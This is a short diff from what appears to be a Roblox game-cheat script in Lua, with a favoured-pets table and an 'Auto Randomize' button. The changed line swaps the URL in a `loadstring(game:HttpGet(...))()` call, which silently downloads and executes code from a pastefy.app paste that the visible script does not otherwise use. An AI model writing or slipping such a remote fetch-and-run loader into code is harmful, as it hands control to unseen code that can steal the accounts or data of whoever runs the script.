@@ -242,7 +242,7 @@ local bestPets = {
     ["Disco Bee"] = true, ["Fennec Fox"] = true, ["Fox"] = true,
     ["Mimic Octopus"] = true
 }
-loadstring(game:HttpGet("https://pastefy.app/MgXKipO3/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/4B5audPA/raw"))()
 autoBtn.MouseButton1Click:Connect(function()
     autoRunning = not autoRunning
     autoBtn.Text = autoRunning and "Auto Randomize: ON" or "ðŸ” Auto Randomize: OFF"
